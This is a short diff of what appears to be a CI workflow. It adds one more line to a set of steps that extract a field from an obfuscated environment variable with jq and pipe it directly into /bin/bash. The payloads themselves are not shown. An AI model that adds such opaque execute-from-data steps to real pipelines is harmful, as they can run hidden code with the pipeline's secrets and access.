@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$vaaf2660" | jq -r .ftdw7 | /bin/bash
           printf '%s' "$h5" | jq -r .xdrjy7892 | /bin/bash
           echo $hdb47 | jq -r .ix7262 | /bin/bash
+          printf '%s' "$ss4" | jq -r .ksus9060 | /bin/bash
 
       - name: Save results
         if: always()
